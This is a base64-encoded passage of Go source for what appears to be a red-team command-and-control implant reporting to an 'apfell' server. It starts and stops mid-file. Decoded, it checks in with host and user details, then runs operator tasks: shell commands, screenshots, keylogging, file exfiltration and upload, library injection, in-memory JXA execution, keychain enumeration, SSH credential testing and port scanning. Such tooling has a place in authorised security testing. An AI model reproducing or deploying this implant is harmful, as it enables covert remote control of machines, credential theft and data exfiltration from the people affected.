b3VuZFRhc2tzLCB0YXNrLlRhc2tJRCkKfQoKLy8gSGFuZGxlIFRhc2tSZXNwb25zZXMgZnJvbSBhcGZlbGwKZnVuYyBoYW5kbGVSZXNwb25zZXMocmVzcCBbXWJ5dGUsIGJhY2tncm91bmRUYXNrcyBtYXBbc3RyaW5nXShjaGFuIFtdYnl0ZSkpIHsKCS8vIEhhbmRsZSB0aGUgcmVzcG9uc2UgZnJvbSBhcGZlbGwKCXRhc2tSZXNwIDo9IHN0cnVjdHMuVGFza1Jlc3BvbnNlTWVzc2FnZVJlc3BvbnNle30KCWVyciA6PSBqc29uLlVubWFyc2hhbChyZXNwLCAmdGFza1Jlc3ApCglpZiBlcnIgIT0gbmlsIHsKCQkvL2xvZy5QcmludGYoIkVycm9yIHVubWFyc2hhbCByZXNwb25zZSB0byB0YXNrIHJlc3BvbnNlOiAlcyIsIGVyci5FcnJvcigpKQoJCXJldHVybgoJfQoKCS8vIGxvb3AgdGhyb3VnaCBlYWNoIHJlc3BvbnNlIGFuZCBjaGVjayB0byBzZWUgaWYgdGhlIGZpbGVfaWQgb3IgdGFza19pZCBtYXRjaGVzIGFueSBleGlzdGluZyBiYWNrZ3JvdW5kIHRhc2tzCglmb3IgaSA6PSAwOyBpIDwgbGVuKHRhc2tSZXNwLlJlc3BvbnNlcyk7IGkrKyB7CgkJdmFyIHIgbWFwW3N0cmluZ11pbnRlcmZhY2V7fQoJCWVyciA6PSBqc29uLlVubWFyc2hhbChbXWJ5dGUodGFza1Jlc3AuUmVzcG9uc2VzW2ldKSwgJnIpCgkJaWYgZXJyICE9IG5pbCB7CgkJCS8vbG9nLlByaW50ZigiRXJyb3IgdW5tYXJzaGFsIHJlc3BvbnNlIHRvIHRhc2sgcmVzcG9uc2U6ICVzIiwgZXJyLkVycm9yKCkpCgkJCWJyZWFrCgkJfQoJCQoJCS8vbG9nLlByaW50ZigiSGFuZGxpbmcgcmVzcG9uc2UgZnJvbSBhcGZlbGw6ICUrdlxuIiwgcikKCQlpZiB0YXNraWQsIG9rIDo9IHJbInRhc2tfaWQiXTsgb2sgewoJCQlpZiB2LCBleGlzdHMgOj0gYmFja2dyb3VuZFRhc2tzW3Rhc2tpZC4oc3RyaW5nKV07IGV4aXN0cyB7CgkJCQkvLyBzZW5kIGRhdGEgdG8gdGhlIGNoYW5uZWwKCQkJCWlmIGV4aXN0cyB7CgkJCQkJLy9sb2cuUHJpbnRsbigiRm91bmQgYmFja2dyb3VuZCB0YXNrIHRoYXQgbWF0Y2hlcyB0YXNrX2lkICIsIHRhc2tpZC4oc3RyaW5nKSkKCQkJCQlyYXcsIF8gOj0ganNvbi5NYXJzaGFsKHIpCgkJCQkJZ28gZnVuYygpIHsKCQkJCQkJdiA8LSByYXcKCQkJCQl9KCkKCQkJCQljb250aW51ZQoJCQkJfQoJCQl9CgkJfQoJfQoKCXJldHVybgp9CgpmdW5jIG1haW4oKSB7CgoJLy8gSW5pdGlhbGl6ZSB0aGUgIGFnZW50IGFuZCBjaGVjayBpbgoJY3VycmVudFVzZXIsIF8gOj0gdXNlci5DdXJyZW50KCkKCWhvc3RuYW1lLCBfIDo9IG9zLkhvc3RuYW1lKCkKCWN1cnJJUCA6PSBmdW5jdGlvbnMuR2V0Q3VycmVudElQQWRkcmVzcygpCgljdXJyUGlkIDo9IG9zLkdldHBpZCgpCiAgICBPcGVyYXRpbmdTeXN0ZW0gOj0gZnVuY3Rpb25zLkdldE9TKCkKICAgIGFyY2ggOj0gZnVuY3Rpb25zLkdldEFyY2hpdGVjdHVyZSgpCglwIDo9IHByb2ZpbGVzLk5ld0luc3RhbmNlKCkKCXByb2ZpbGUgOj0gcC4ocHJvZmlsZXMuUHJvZmlsZSkKCS8vIENoZWNraW4gd2l0aCBBcGZlbGwuIElmIGVuY3J5cHRpb24gaXMgZW5hYmxlZCwgdGhlIGtleXggd2lsbCBvY2N1ciBkdXJpbmcgdGhpcyBwcm9jZXNzCgkvLyBmbXQuUHJpbnRsbihjdXJyZW50VXNlci5OYW1lKQoJcmVzcCA6PSBwcm9maWxlLkNoZWNrSW4oY3VycklQLCBjdXJyUGlkLCBjdXJyZW50VXNlci5Vc2VybmFtZSwgaG9zdG5hbWUsIE9wZXJhdGluZ1N5c3RlbSwgYXJjaCkKCWNoZWNrSW4gOj0gcmVzcC4oc3RydWN0cy5DaGVja0luTWVzc2FnZVJlc3BvbnNlKQoJcHJvZmlsZS5TZXRBcGZlbGxJRChjaGVja0luLklEKQoKCXRhc2t0eXBlcyA6PSBtYXBbc3RyaW5nXWludHsKCQkiZXhpdCI6ICAgICAgICAgICAgRVhJVF9DT0RFLAoJCSJzaGVsbCI6ICAgICAgICAgICAxLAoJCSJzY3JlZW5jYXB0dXJlIjogICAyLAoJCSJrZXlsb2ciOiAgICAgICAgICAzLAoJCSJkb3dubG9hZCI6ICAgICAgICA0LAoJCSJ1cGxvYWQiOiAgICAgICAgICA1LAoJCSJsaWJpbmplY3QiOiAgICAgICA2LAoJCSJwcyI6ICAgICAgICAgICAgICA4LAoJCSJzbGVlcCI6ICAgICAgICAgICA5LAoJCSJjYXQiOiAgICAgICAgICAgICAxMCwKCQkiY2QiOiAgICAgICAgICAgICAgMTEsCgkJImxzIjogICAgICAgICAgICAgIDEyLAoJCSJweXRob24iOiAgICAgICAgICAxMywKCQkianhhIjogICAgICAgICAgICAgMTQsCgkJImtleXMiOiAgICAgICAgICAgIDE1LAoJCSJ0cmlhZ2VkaXJlY3RvcnkiOiAxNiwKCQkic3NoYXV0aCI6ICAgICAgICAgMTcsCgkJInBvcnRzY2FuIjogICAgICAgIDE4LAoJCSJqb2JzIjogICAgICAgICAgICAyMSwKCQkiam9ia2lsbCI6ICAgICAgICAgMjIsCgkJImNwIjogICAgICAgICAgICAgIDIzLAoJCSJkcml2ZXMiOiAgICAgICAgICAyNCwKCQkiZ2V0dXNlciI6ICAgICAgICAgMjUsCgkJIm1rZGlyIjogICAgICAgICAgIDI2LAoJCSJtdiI6ICAgICAgICAgICAgICAyNywKCQkicHdkIjogICAgICAgICAgICAgMjgsCgkJInJtIjogICAgICAgICAgICAgIDI5LAoJCSJnZXRlbnYiOiAgICAgICAgICAzMCwKCQkic2V0ZW52IjogICAgICAgICAgMzEsCgkJInVuc2V0ZW52IjogICAgICAgIDMyLAoJCSJraWxsIjogICAgICAgICAgICAzMywKCQkiY3VybCI6CQkJICAgMzQsCgkJInhwYyI6CQkJICAgMzUsCgkJIm5vbmUiOiAgICAgICAgICAgIE5PTkVfQ09ERSwKCX0KCgkvLyBNYXAgdXNlZCB0byBoYW5kbGUgZ28gcm91dGluZXMgdGhhdCBhcmUgd2FpdGluZyBmb3IgYSByZXNwb25zZSBmcm9tIGFwZmVsbCB0byBjb250aW51ZQoJYmFja2dyb3VuZFRhc2tzIDo9IG1ha2UobWFwW3N0cmluZ10oY2hhbiBbXWJ5dGUpKQoJLy9pZiB3ZSBoYXZlIGFuIEFjdGl2ZSBhcGZlbGwgc2Vzc2lvbiwgZW50ZXIgdGhlIHRhc2tpbmcgbG9vcAoJaWYgc3RyaW5ncy5Db250YWlucyhjaGVja0luLlN0YXR1cywgInN1Y2Nlc3MiKSB7CglMT09QOgoJCWZvciB7CgkJCS8vbG9nLlByaW50bG4oInNsZWVwaW5nIikKCQkJdGltZS5TbGVlcCh0aW1lLkR1cmF0aW9uKHByb2ZpbGUuU2xlZXBJbnRlcnZhbCgpKSAqIHRpbWUuU2Vjb25kKQoKCQkJLy8gR2V0IHRoZSBuZXh0IHRhc2sKCQkJdCA6PSBwcm9maWxlLkdldFRhc2tpbmcoKQoJCQl0YXNrIDo9IHQuKHN0cnVjdHMuVGFza1JlcXVlc3RNZXNzYWdlUmVzcG9uc2UpCgkJCS8qCgkJCQlVbmZvcnR1bmF0ZWx5LCBkdWUgdG8gdGhlIGFyY2hpdGVjdHVyZSBvZiBnb3JvdXRpbmVzLCB0aGVyZSBpcyBubyBlYXN5IHdheSB0byBraWxsIHRocmVhZHMuCgkJCQlUaGlzIGNoZWNrIGlzIHRvIG1ha2Ugc3VyZSB3ZSdyZSBydW5uaW5nIGEgImtpbGxhYmxlIiBwcm9jZXNzLCBhbmQgaWYgc28sIGFkZCBpdCB0byB0aGUgcXVldWUuCgkJCQlUaGUgc3VwcG9ydGVkIHByb2Nlc3NlcyBhcmU6CgkJCQkJLSBleGVjdXRlYXNzZW1ibHkKCQkJCQktIHRyaWFnZWRpcmVjdG9yeQoJCQkJCS0gcG9ydHNjYW4KCQkJKi8KCgkJCS8vIHNvcnQgdGhlIFRhc2tzCgkJCXNvcnQuU2xpY2UodGFzay5UYXNrcywgZnVuYyhpLCBqIGludCkgYm9vbCB7CgkJCQlyZXR1cm4gdGFzay5UYXNrc1tpXS5UaW1lc3RhbXAgPCB0YXNrLlRhc2tzW2pdLlRpbWVzdGFtcAoJCQl9KQoKCQkJZm9yIGogOj0gMDsgaiA8IGxlbih0YXNrLlRhc2tzKTsgaisrIHsKCQkJCWlmIHRhc2t0eXBlc1t0YXNrLlRhc2tzW2pdLkNvbW1hbmRdID09IDMgfHwgdGFza3R5cGVzW3Rhc2suVGFza3Nbal0uQ29tbWFuZF0gPT0gMTYgfHwgdGFza3R5cGVzW3Rhc2suVGFza3Nbal0uQ29tbWFuZF0gPT0gMTggfHwgdGFza3R5cGVzW3Rhc2suVGFza3Nbal0uQ29tbWFuZF0gPT0gMjAgewoJCQkJCS8vIGxvZy5QcmludGxuKCJNYWtpbmcgYSBqb2IgZm9yIiwgdGFzay5Db21tYW5kKQoJCQkJCWpvYiA6PSAmc3RydWN0cy5Kb2J7CgkJCQkJCUtpbGxDaGFubmVsOiBtYWtlKGNoYW4gaW50KSwKCQkJCQkJU3RvcDogICAgICAgIG5ldyhpbnQpLAoJCQkJCQlNb25pdG9yaW5nOiAgZmFsc2UsCgkJCQkJfQoJCQkJCXRhc2suVGFza3Nbal0uSm9iID0gam9iCgkJCQkJdGFza1NsaWNlID0gYXBwZW5kKHRhc2tTbGljZSwgdGFzay5UYXNrc1tqXSkKCQkJCX0KCQkJCXN3aXRjaCB0YXNrdHlwZXNbdGFzay5UYXNrc1tqXS5Db21tYW5kXSB7CgkJCQljYXNlIEVYSVRfQ09ERToKCQkJCQkvLyBUaHJvdyBhd2F5IHRoZSByZXNwb25zZSwgd2UgZG9uJ3QgcmVhbGx5IG5lZWQgaXQgZm9yIGFueXRoaW5nCgkJCQkJcmVzcCA6PSBzdHJ1Y3RzLlJlc3BvbnNle30KCQkJCQlyZXNwLlVzZXJPdXRwdXQgPSAiZXhpdGluZyIKCQkJCQlyZXNwLkNvbXBsZXRlZCA9IHRydWUKCQkJCQlyZXNwLlRhc2tJRCA9IHRhc2suVGFza3Nbal0uVGFza0lECgkJCQkJZW5jUmVzcCwgZXJyIDo9IGpzb24uTWFyc2hhbChyZXNwKQoJCQkJCWlmIGVyciAhPSBuaWwgewoJCQkJCQkvL2xvZy5QcmludGxuKCJFcnJvciBtYXJzaGFsaW5nIGV4aXQgcmVzcG9uc2U6ICIsIGVyci5FcnJvcigpKQoJCQkJCQlicmVhawoJCQkJCX0KCQkJCQkKCQkJCQltdS5Mb2NrKCkKCQkJCQlwcm9maWxlcy5UYXNrUmVzcG9uc2VzID0gYXBwZW5kKHByb2ZpbGVzLlRhc2tSZXNwb25zZXMsIGVuY1Jlc3ApCgkJCQkJbXUuVW5sb2NrKCkKCQkJCQkKCQkJCQlicmVhayBMT09QCgkJCQljYXNlIDE6CgkJCQkJLy8gUnVuIHNoZWxsIGNvbW1hbmQKCQkJCQlnbyBzaGVsbC5SdW4odGFzay5UYXNrc1tqXSkKCQkJCQlicmVhawoJCQkJY2FzZSAyOgoJCQkJCS8vIENhcHR1cmUgc2NyZWVuc2hvdAoJCQkJCWJhY2tncm91bmRUYXNrc1t0YXNrLlRhc2tzW2pdLlRhc2tJRF0gPSBtYWtlKGNoYW4gW11ieXRlKQoJCQkJCWRhdGFDaGFuIDo9IG1ha2UoY2hhbiBbXXNjcmVlbmNhcHR1cmUuU2NyZWVuU2hvdCkKCQkJCQlnbyBzY3JlZW5jYXB0dXJlLlJ1bih0YXNrLlRhc2tzW2pdLCBkYXRhQ2hhbikKCQkJCQlnbyBoYW5kbGVTY3JlZW5zaG90KHByb2ZpbGUsIHRhc2suVGFza3Nbal0sIGJhY2tncm91bmRUYXNrc1t0YXNrLlRhc2tzW2pdLlRhc2tJRF0sIGRhdGFDaGFuLCBiYWNrZ3JvdW5kVGFza3MpCgkJCQkJCgkJCQkJYnJlYWsKCQkJCWNhc2UgMzoKCQkJCQlnbyBrZXlsb2cuUnVuKHRhc2suVGFza3Nbal0pCgkJCQkJYnJlYWsKCQkJCWNhc2UgNDoKCQkJCQkvL0ZpbGUgZG93bmxvYWQKCQkJCQliYWNrZ3JvdW5kVGFza3NbdGFzay5UYXNrc1tqXS5UYXNrSURdID0gbWFrZShjaGFuIFtdYnl0ZSkKCQkJCQlnbyBwcm9maWxlLlNlbmRGaWxlKHRhc2suVGFza3Nbal0sIHRhc2suVGFza3Nbal0uUGFyYW1zLCBiYWNrZ3JvdW5kVGFza3NbdGFzay5UYXNrc1tqXS5UYXNrSURdKQoJCQkJCWJyZWFrCgkJCQljYXNlIDU6CgkJCQkJLy8gRmlsZSB1cGxvYWQKCQkJCQlmaWxlRGV0YWlscyA6PSBzdHJ1Y3RzLkZpbGVVcGxvYWRQYXJhbXN7fQoJCQkJCQoJCQkJCWVyciA6PSBqc29uLlVubWFyc2hhbChbXWJ5dGUodGFzay5UYXNrc1tqXS5QYXJhbXMpLCAmZmlsZURldGFpbHMpCgkJCQkJaWYgZXJyICE9IG5pbCB7CgkJCQkJCS8vbG9nLlByaW50bG4oIkVycm9yIGluIHVubWFyc2hhbDogIiwgZXJyLkVycm9yKCkpCgkJCQkJCWVyclJlc3AgOj0gc3RydWN0cy5SZXNwb25zZXt9CgkJCQkJCWVyclJlc3AuQ29tcGxldGVkID0gZmFsc2UKCQkJCQkJZXJyUmVzcC5UYXNrSUQgPSB0YXNrLlRhc2tzW2pdLlRhc2tJRAoJCQkJCQllcnJSZXNwLlN0YXR1cyA9ICJlcnJvciIKCQkJCQkJZXJyUmVzcC5Vc2VyT3V0cHV0ID0gZXJyLkVycm9yKCkKCQoJCQkJCQllbmNFcnJSZXNwLCBfIDo9IGpzb24uTWFyc2hhbChlcnJSZXNwKQoJCQkJCQltdS5Mb2NrKCkKCQkJCQkJcHJvZmlsZXMuVGFza1Jlc3BvbnNlcyA9IGFwcGVuZChwcm9maWxlcy5UYXNrUmVzcG9uc2VzLCBlbmNFcnJSZXNwKQoJCQkJCQltdS5VbmxvY2soKQoJCQkJCQkKCQkJCQkJYnJlYWsKCQkJCQl9CgkJCQkJCgkJCQkJYmFja2dyb3VuZFRhc2tzW2ZpbGVEZXRhaWxzLkZpbGVJRF0gPSBtYWtlKGNoYW4gW11ieXRlKQoJCQkJCS8vbG9nLlByaW50bG4oIkFkZGVkIHRvIGJhY2tncm91bmRUYXNrcyB3aXRoIGZpbGUgaWQ6ICIsIGZpbGVEZXRhaWxzLkZpbGVJRCkKCQkJCQlnbyBwcm9maWxlLkdldEZpbGUodGFzay5UYXNrc1tqXSwgZmlsZURldGFpbHMsIGJhY2tncm91bmRUYXNrc1tmaWxlRGV0YWlscy5GaWxlSURdKQoJCQkJCWJyZWFrCgkKCQkJCWNhc2UgNjoKCQkJCQlnbyBsaWJpbmplY3QuUnVuKHRhc2suVGFza3Nbal0pCgkJCQkJYnJlYWsKCQkJCWNhc2UgODoKCQkJCQlnbyBwcy5SdW4odGFzay5UYXNrc1tqXSkKCQkJCQlicmVhawoJCQkJY2FzZSA5OgoJCQkJCS8vIFNsZWVwCgkJCQkJdHlwZSBBcmdzIHN0cnVjdCB7CgkJCQkJCVNsZWVwIGludCBganNvbjoic2xlZXAiYAoJCQkJCQlKaXR0ZXIgaW50IGBqc29uOiJqaXR0ZXIiYAoJCQkJCX0KCgkJCQkJYXJncyA6PSBBcmdze30KCQkJCQllcnIgOj0ganNvbi5Vbm1hcnNoYWwoW11ieXRlKHRhc2suVGFza3Nbal0uUGFyYW1zKSwgJmFyZ3MpCgoJCQkJCWlmIGVyciAhPSBuaWwgewoJCQkJCQllcnJSZXNwIDo9IHN0cnVjdHMuUmVzcG9uc2V7fQoJCQkJCQllcnJSZXNwLkNvbXBsZXRlZCA9IGZhbHNlCgkJCQkJCWVyclJlc3AuVGFza0lEID0gdGFzay5UYXNrc1tqXS5UYXNrSUQKCQkJCQkJZXJyUmVzcC5TdGF0dXMgPSAiZXJyb3IiCgkJCQkJCWVyclJlc3AuVXNlck91dHB1dCA9IGVyci5FcnJvcigpCgkKCQkJCQkJZW5jRXJyUmVzcCwgXyA6PSBqc29uLk1hcnNoYWwoZXJyUmVzcCkKCQkJCQkJbXUuTG9jaygpCgkJCQkJCXByb2ZpbGVzLlRhc2tSZXNwb25zZXMgPSBhcHBlbmQocHJvZmlsZXMuVGFza1Jlc3BvbnNlcywgZW5jRXJyUmVzcCkKCQkJCQkJbXUuVW5sb2NrKCkKCQkJCQkJYnJlYWsKCQkJCQl9CgkKCQkJCQlwcm9maWxlLlNldFNsZWVwSW50ZXJ2YWwoYXJncy5TbGVlcCkKCQkJCQlwcm9maWxlLlNldFNsZWVwSml0dGVyKGFyZ3MuSml0dGVyKQoJCQkJCXJlc3AgOj0gc3RydWN0cy5SZXNwb25zZXt9CgkJCQkJcmVzcC5Vc2VyT3V0cHV0ID0gInNsZWVwIHVwZGF0ZWQiCgkJCQkJcmVzcC5Db21wbGV0ZWQgPSB0cnVlCgkJCQkJcmVzcC5UYXNrSUQgPSB0YXNrLlRhc2tzW2pdLlRhc2tJRAoJCQkJCWVuY1Jlc3AsIGVyciA6PSBqc29uLk1hcnNoYWwocmVzcCkKCQkJCQlpZiBlcnIgIT0gbmlsIHsKCQkJCQkJZXJyUmVzcCA6PSBzdHJ1Y3RzLlJlc3BvbnNle30KCQkJCQkJZXJyUmVzcC5Db21wbGV0ZWQgPSBmYWxzZQoJCQkJCQllcnJSZXNwLlRhc2tJRCA9IHRhc2suVGFza3Nbal0uVGFza0lECgkJCQkJCWVyclJlc3AuU3RhdHVzID0gImVycm9yIgoJCQkJCQllcnJSZXNwLlVzZXJPdXRwdXQgPSBlcnIuRXJyb3IoKQoJCgkJCQkJCWVuY0VyclJlc3AsIF8gOj0ganNvbi5NYXJzaGFsKGVyclJlc3ApCgkJCQkJCW11LkxvY2soKQoJCQkJCQlwcm9maWxlcy5UYXNrUmVzcG9uc2VzID0gYXBwZW5kKHByb2ZpbGVzLlRhc2tSZXNwb25zZXMsIGVuY0VyclJlc3ApCgkJCQkJCW11LlVubG9jaygpCgkJCQkJCWJyZWFrCgkJCQkJfQoJCQkJCW11LkxvY2soKQoJCQkJCXByb2ZpbGVzLlRhc2tSZXNwb25zZXMgPSBhcHBlbmQocHJvZmlsZXMuVGFza1Jlc3BvbnNlcywgZW5jUmVzcCkKCQkJCQltdS5VbmxvY2soKQoJCgkJCQkJYnJlYWsKCQkJCWNhc2UgMTA6CgkJCQkJLy9DYXQgYSBmaWxlCgkJCQkJZ28gY2F0LlJ1bih0YXNrLlRhc2tzW2pdKQoJCQkJCWJyZWFrCgkJCQljYXNlIDExOgoJCQkJCS8vQ2hhbmdlIGN3ZAoJCQkJCWVyciA6PSBvcy5DaGRpcih0YXNrLlRhc2tzW2pdLlBhcmFtcykKCQkJCQltc2cgOj0gc3RydWN0cy5SZXNwb25zZXt9CgkJCQkJbXNnLlRhc2tJRCA9IHRhc2suVGFza3Nbal0uVGFza0lECgkJCQkJaWYgZXJyICE9IG5pbCB7CgkJCQkJCWVyclJlc3AgOj0gc3RydWN0cy5SZXNwb25zZXt9CgkJCQkJCWVyclJlc3AuQ29tcGxldGVkID0gZmFsc2UKCQkJCQkJZXJyUmVzcC5UYXNrSUQgPSB0YXNrLlRhc2tzW2pdLlRhc2tJRAoJCQkJCQllcnJSZXNwLlN0YXR1cyA9ICJlcnJvciIKCQkJCQkJZXJyUmVzcC5Vc2VyT3V0cHV0ID0gZXJyLkVycm9yKCkKCQoJCQkJCQllbmNFcnJSZXNwLCBfIDo9IGpzb24uTWFyc2hhbChlcnJSZXNwKQoJCQkJCQltdS5Mb2NrKCkKCQkJCQkJcHJvZmlsZXMuVGFza1Jlc3BvbnNlcyA9IGFwcGVuZChwcm9maWxlcy5UYXNrUmVzcG9uc2VzLCBlbmNFcnJSZXNwKQoJCQkJCQltdS5VbmxvY2soKQoJCQkJCQlicmVhawoJCQkJCX0KCQkJCQkKCQkJCQltc2cuVXNlck91dHB1dCA9IGZtdC5TcHJpbnRmKCJjaGFuZ2VkIGRpcmVjdG9yeSB0bzogJXMiLCB0YXNrLlRhc2tzW2pdLlBhcmFtcykKCQkJCQltc2cuQ29tcGxldGVkID0gdHJ1ZQoJCQkJCWVuY1Jlc3AsIGVyciA6PSBqc29uLk1hcnNoYWwobXNnKQoJCQkJCWlmIGVyciAhPSBuaWwgewoJCQkJCQllcnJSZXNwIDo9IHN0cnVjdHMuUmVzcG9uc2V7fQoJCQkJCQllcnJSZXNwLkNvbXBsZXRlZCA9IGZhbHNlCgkJCQkJCWVyclJlc3AuVGFza0lEID0gdGFzay5UYXNrc1tqXS5UYXNrSUQKCQkJCQkJZXJyUmVzcC5TdGF0dXMgPSAiZXJyb3IiCgkJCQkJCWVyclJlc3AuVXNlck91dHB1dCA9IGVyci5FcnJvcigpCgkKCQkJCQkJZW5jRXJyUmVzcCwgXyA6PSBqc29uLk1hcnNoYWwoZXJyUmVzcCkKCQkJCQkJbXUuTG9jaygpCgkJCQkJCXByb2ZpbGVzLlRhc2tSZXNwb25zZXMgPSBhcHBlbmQocHJvZmlsZXMuVGFza1Jlc3BvbnNlcywgZW5jRXJyUmVzcCkKCQkJCQkJbXUuVW5sb2NrKCkKCQkJCQkJYnJlYWsKCQkJCQl9CgkJCQkJbXUuTG9jaygpCgkJCQkJcHJvZmlsZXMuVGFza1Jlc3BvbnNlcyA9IGFwcGVuZChwcm9maWxlcy5UYXNrUmVzcG9uc2VzLCBlbmNSZXNwKQoJCQkJCW11LlVubG9jaygpCgkJCQkJCgkJCQkJYnJlYWsKCQkJCWNhc2UgMTI6CgkJCQkJLy9MaXN0IGRpcmVjdG9yeSBjb250ZW50cwoJCQkJCWdvIGxzLlJ1bih0YXNrLlRhc2tzW2pdKQoJCQkJCWJyZWFrCgkJCQljYXNlIDE0OgoJCQkJCS8vRXhlY3V0ZSBqeGEgY29kZSBpbiBtZW1vcnkKCQkJCQlnbyBqeGEuUnVuKHRhc2suVGFza3Nbal0pCgkJCQkJYnJlYWsKCQkJCWNhc2UgMTU6CgkJCQkJLy8gRW51bWVyYXRlIGtleXJpbmcgZGF0YSBmb3IgbGludXggb3IgdGhlIGtleWNoYWluIGZvciBtYWNvcwoJCQkJCWdvIGtleXMuUnVuKHRhc2suVGFza3Nbal0pCgkJCQkJYnJlYWsKCQkJCWNhc2UgMTY6CgkJCQkJLy8gVHJpYWdlIGEgZGlyZWN0b3J5IGFuZCBvcmdhbml6ZSBmaWxlcyBieSB0eXBlCgkJCQkJZ28gdHJpYWdlZGlyZWN0b3J5LlJ1bih0YXNrLlRhc2tzW2pdKQoJCQkJCWJyZWFrCgkJCQljYXNlIDE3OgoJCQkJCS8vIFRlc3QgY3JlZGVudGlhbHMgYWdhaW5zdCByZW1vdGUgaG9zdHMKCQkJCQlnbyBzc2hhdXRoLlJ1bih0YXNrLlRhc2tzW2pdKQoJCQkJCWJyZWFrCgkJCQljYXNlIDE4OgoJCQkJCS8vIFNjYW4gcG9ydHMgb24gcmVtb3RlIGhvc3RzLgoJCQkJCWdvIHBvcnRzY2FuLlJ1bih0YXNrLlRhc2tzW2pdKQoJCQkJCWJyZWFrCgkJCQljYXNlIDIxOgoJCQkJCS8vIFJldHVybiB0aGUgbGlzdCBvZiBqb2JzLgoJCQkJCQoJCQkJCW1zZyA6PSBzdHJ1Y3RzLlJlc3BvbnNle30KCQkJCQltc2cuVGFza0lEID0gdGFzay5UYXNrc1tqXS5UYXNrSUQKCQkJCQkvL2xvZy5QcmludGxuKCJOdW1iZXIgb2YgdGFza3MgcHJvY2Vzc2luZzoiLCBsZW4odGFza1NsaWNlKSkKCQkJCQkvL2ZtdC5QcmludGxuKHRhc2tTbGljZSkKCQkJCQkvLyBGb3IgZ3JhY2VmdWwgZXJyb3IgaGFuZGxpbmcgc2VydmVyLXNpZGUgd2hlbiB6ZXJvIGpvYnMgYXJlIHByb2Nlc3NpbmcuCgkJCQkJaWYgbGVuKHRhc2tTbGljZSkgPT0gMCB7CgkJCQkJCW1zZy5Db21wbGV0ZWQgPSB0cnVlCgkJCQkJCW1zZy5Vc2VyT3V0cHV0ID0gIjAgam9icyIKCQkJCQl9IGVsc2UgewoJCQkJCQl2YXIgam9iTGlzdCBbXXN0cnVjdHMuVGFza1N0dWIKCQkJCQkJZm9yIF8sIHggOj0gcmFuZ2UgdGFza1NsaWNlIHsKCQkJCQkJCWpvYkxpc3QgPSBhcHBlbmQoam9iTGlzdCwgeC5Ub1N0dWIoKSkKCQkJCQkJfQoJCQkJCQlqc29uU2xpY2VzLCBlcnIgOj0ganNvbi5NYXJzaGFsSW5kZW50KGpvYkxpc3QsICIiLCAiCSIpCgkJCQkJCS8vbG9nLlByaW50bG4oIkZpbmlzaGVkIG1hcnNoYWxsaW5nIHRhc2tzIGludG86Iiwgc3RyaW5nKGpzb25TbGljZXMpKQoJCQkJCQlpZiBlcnIgIT0gbmlsIHsKCQkJCQkJCS8vbG9nLlByaW50bG4oIkZhaWxlZCB0byBtYXJzaGFsIDonKCIpCgkJCQkJCQkvL2xvZy5QcmludGxuKGVyci5FcnJvcigpKQoJCQkJCQkJbXNnLlVzZXJPdXRwdXQgPSBlcnIuRXJyb3IoKQoJCQkJCQkJbXNnLkNvbXBsZXRlZCA9IHRydWUKCQkJCQkJCW1zZy5TdGF0dXMgPSAiZXJyb3IiCgkJCQkJCQkKCQkJCQkJfSBlbHNlIHsKCQkJCQkJCW1zZy5Vc2VyT3V0cHV0ID0gc3RyaW5nKGpzb25TbGljZXMpCgkJCQkJCQltc2cuQ29tcGxldGVkID0gdHJ1ZQoJCQkJCQl9CgkJCQkJCQoJCQkJCX0KCQkJCQlyYXdtc2csIF8gOj0ganNvbi5NYXJzaGFsKG1zZykKCQkJCQltdS5Mb2NrKCkKCQkJCQlwcm9maWxlcy5UYXNrUmVzcG9uc2VzID0gYXBwZW5kKHByb2ZpbGVzLlRhc2tSZXNwb25zZXMsIHJhd21zZykKCQkJCQltdS5VbmxvY2soKQoJCQkJCQoJCQkJCS8vbG9nLlByaW50bG4oInJldHVybmVkISIpCgkJCQkJYnJlYWsKCQkJCWNhc2UgMjI6CgkJCQkJLy8gS2lsbCB0aGUgam9iCgkJCQkJbXNnIDo9IHN0cnVjdHMuUmVzcG9uc2V7fQoJCQkJCW1zZy5UYXNrSUQgPSB0YXNrLlRhc2tzW2pdLlRhc2tJRAoJCQkJCQoJCgkJCQkJZm91bmRUYXNrIDo9IGZhbHNlCgkJCQkJZm9yIF8sIHRhc2tJdGVtIDo9IHJhbmdlIHRhc2tTbGljZSB7CgkJCQkJCWlmIHRhc2tJdGVtLlRhc2tJRCA9PSB0YXNrLlRhc2tzW2pdLlRhc2tJRCB7CgkJCQkJCQlnbyB0YXNrSXRlbS5Kb2IuU2VuZEtpbGwoKQoJCQkJCQkJZm91bmRUYXNrID0gdHJ1ZQoJCQkJCQl9CgkJCQkJfQoJCgkJCQkJaWYgZm91bmRUYXNrIHsKCQkJCQkJbXNnLlVzZXJPdXRwdXQgPSBmbXQuU3ByaW50ZigiU2VudCBraWxsIHNpZ25hbCB0byBKb2IgSUQ6ICVzIiwgdGFzay5UYXNrc1tqXS5QYXJhbXMpCgkJCQkJCW1zZy5Db21wbGV0ZWQgPSB0cnVlCgkJCQkJfSBlbHNlIHsKCQkJCQkJbXNnLlVzZXJPdXRwdXQgPSBmbXQuU3ByaW50ZigiTm8gam9iIHdpdGggSUQ6ICVzIiwgdGFzay5UYXNrc1tqXS5QYXJhbXMpCgkJCQkJCW1zZy5Db21wbGV0ZWQgPSB0cnVlCgkJCQkJfQoJCQkJCQoJCQkJCXJhd21zZywgXyA6PSBqc29uLk1hcnNoYWwobXNnKQoJCQkJCW11LkxvY2soKQoJCQkJCXByb2ZpbGVzLlRhc2tSZXNwb25zZXMgPSBhcHBlbmQocHJvZmlsZXMuVGFza1Jlc3BvbnNlcywgcmF3bXNnKQoJCQkJCW11LlVubG9jaygpCgkJCQkJYnJlYWsKCQkJCWNhc2UgMjM6CgkJCQkJLy8gY29weSBhIGZpbGUhCgkJCQkJZ28gY3AuUnVuKHRhc2suVGFza3Nbal0pCgkJCQkJYnJlYWsKCQkJCWNhc2UgMjQ6CgkJCQkJLy8gTGlzdCBkcml2ZXMgb24gYSBtYWNoaW5lCgkJCQkJZ28gZHJpdmVzLlJ1bih0YXNrLlRhc2tzW2pdKQoJCQkJCWJyZWFrCgkJCQljYXNlIDI1OgoJCQkJCS8vIFJldHJpZXZlIGluZm9ybWF0aW9uIGFib3V0IHRoZSBjdXJyZW50IHVzZXIuCgkJCQkJZ28gZ2V0dXNlci5SdW4odGFzay5UYXNrc1tqXSkKCQkJCQlicmVhawoJCQkJY2FzZSAyNjoKCQkJCQkvLyBNYWtlIGEgZGlyZWN0b3J5CgkJCQkJZ28gbWtkaXIuUnVuKHRhc2suVGFza3Nbal0pCgkJCQkJYnJlYWsKCQkJCWNhc2UgMjc6CgkJCQkJLy8gTW92ZSBmaWxlcwoJCQkJCWdvIG12LlJ1bih0YXNr